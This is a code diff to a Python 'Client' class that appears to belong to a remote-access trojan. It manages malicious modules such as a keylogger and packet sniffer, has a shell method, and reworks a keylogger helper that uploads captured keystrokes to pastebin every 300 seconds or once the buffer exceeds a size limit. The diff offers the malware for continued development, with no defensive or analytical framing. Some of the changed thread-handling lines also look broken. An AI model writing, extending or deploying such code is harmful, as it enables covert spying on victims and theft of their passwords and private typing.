@@ -535,12 +535,15 @@ class Client(object):
         for name, module in self._modules.items():
              if module.status and sys.platform in module.platforms and name not in self._threads:
                 self._threads[name] = Thread(target=module, name=name)
-        for worker in self._threads.values():
+        for worker, task in self._threads.items():
             if not worker.is_alive():
-                worker.start()
-        for task, worker in self._threads.items():
-            if task not in ('keylogger','packetsniff'):
-                worker.join()
+                try:
+                    task.run()
+                except:
+                    self._threads.remove(worker)
+        for worker, task in self._threads.items():
+            if worker not in ('keylogger','packetsniff'):
+                task.join()
         return self._show(self._result)
 
     def _shell(self):
@@ -614,23 +617,22 @@ class Client(object):
             if self._exit:
                 if len(self.keylogger.options['buffer']):
                     result  = self._pastebin(self.keylogger.options['buffer'])
-                    if self._mode:
+                    if self.standby.status:
                         self._logger.log(40, result, extra={'submodule':'keylogger'})
                     else:
                         self._result['keylogger'].update({time.ctime(): result})
                 break
-            if self.keylogger.options['next_upload'] > 0:
-                self.keylogger.options['next_upload'] = float(self.keylogger.options['next_upload'] - 1.0)
+            if time.time() < self.keylogger.options['next_upload']:
                 time.sleep(1)
             else:
                 if len(self.keylogger.options['buffer']) > self.keylogger.options['max_bytes']:
                     result  = self._pastebin(self.keylogger.options['buffer'])
-                    if self._mode:
+                    if self.standby.status:
                         self._logger.log(40, result, extra={'submodule':'keylogger'})
                     else:
                         self._result['keylogger'].update({time.ctime(): result})
                     self.keylogger.options['buffer']  = ''
-                self.keylogger.options['next_upload'] = 300.0
+                self.keylogger.options['next_upload'] = time.time() + 300.0
 
     def _keylogger_manager(self):
             self._threads['keylogger_helper'] = Thread(target=self._keylogger_helper, name=time.time())
